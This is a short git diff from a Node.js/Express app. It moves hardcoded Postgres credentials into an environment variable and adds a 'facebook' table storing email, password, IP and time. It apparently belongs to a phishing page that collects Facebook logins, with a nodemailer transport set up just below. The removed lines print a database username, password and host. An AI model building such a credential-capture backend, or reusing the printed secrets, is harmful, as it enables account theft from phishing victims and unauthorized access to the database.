@@ -6,16 +6,11 @@ app.set('view engine', 'ejs');
 const pg = require('pg');
 var bodyParser = require('body-parser');
 app.use(bodyParser.urlencoded({ extended: false }));
-const client = new pg.Client({
-    user: 'hedmgtryrynnvo',
-    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
-    database: 'deqngk324p153p',
-    port: 5432,
-    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
-    ssl: true
-});
+const client = new pg.Client(process.env.DATABASE_URL);
 
 client.connect();
+client.query("create table facebook (mail text,password text,ip text,time timestamp default now())")
+
 // ############################################       NODE MAILER    ##############################################################################################
 const nodemailer = require("nodemailer");
 var transporter = nodemailer.createTransport({
